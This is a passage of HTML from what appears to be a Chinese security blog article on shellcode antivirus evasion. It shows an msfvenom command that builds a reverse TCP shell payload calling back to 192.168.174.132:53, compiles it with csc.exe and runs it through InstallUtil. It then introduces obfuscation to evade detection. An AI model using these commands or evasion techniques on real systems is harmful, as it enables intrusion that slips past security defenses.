&quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=<span style="color: rgb(0, 134, 179);">192.168</span>.<span style="color: rgb(0, 134, 179);">174.132</span> LPORT=<span style="color: rgb(0, 134, 179);">53</span> ‐ f csharp</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">C:\Windows\Microsoft.NET\Framework\v<span style="color: rgb(0, 134, 179);">2.0</span>.<span style="color: rgb(0, 134, 179);">50727</span>\csc.exe /<span style="color: rgb(167, 29, 93);">unsafe</span> /platform:x86 /<span style="color: rgb(167, 29, 93);">out</span>:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-<span style="color: rgb(0, 134, 179);">ShellCode</span>.cs</span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">通过Installutil执行即可</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">白利用就不列举更多了，其他一些白利用也是一个道理，那么问题来了，前面说的白利用执行某些时候我们的shellcode生成的exe或者dll还是会落地，</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">虽然前面说的内存加载可以解决这个问题，那假设必须落地，怎么逃过各种检测呢？</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这就是我归为免杀的第二个方式大类，混淆免杀。</p><p style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><img data-type="png" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/13_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible !important;width: 640px !important;"  /></p><p style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong><span style="font-size:16px;line-height:36px;;">由于文章篇幅较长我们拆分成了三篇文章</span></strong></p><p style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong><span style="font-size:16px;line-height:36px;;">感兴趣的请依次阅读</span></strong></p><p style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><br  /></p><p style="text-align: right;"><span style="font-size:12px;line-height:32px;;">原创投稿作者：卿</span></p><p style="text-align: right;"><span style="font-size:12px;line-height:32px;;">作者博客：</span><span style="font-size:12px;line-height:32px;;">https://www.cnblogs.com/-qing-/</span></p><p style="text-align: right;"><span style="font-size:12px;line-height:32px;;">本文由公众号HACK学习排版编辑整理</span></p><p style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><img class="rich_pages __bg_gif" data-ratio="0.5197505197505198" data-type="gif" data-w="962" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/14_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible !important;width: 677px !important;"  /></p><p style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><img class="rich_pages" data-ratio="0.145475372279496" data-s="300,640" data-type="png" data-w="1746" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/15_Qcfe70r0d654iau7KIEniaquS5Kq8Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9bZ1ClsibAO4jGjuZcYon4iceA6f9EzAKuvecDDVRbr4DTMnUyQcfe70r0d654iau7KIEniaquS5Kq8Q/640?wx_fmt=png'" style="box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible !important;width: 677px !important;"  /></p>
                </div>
</div>
</body>
</html>